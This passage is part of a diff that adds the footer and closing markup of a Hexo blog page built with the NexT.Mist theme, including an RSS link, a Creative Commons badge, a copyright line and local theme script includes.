+        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
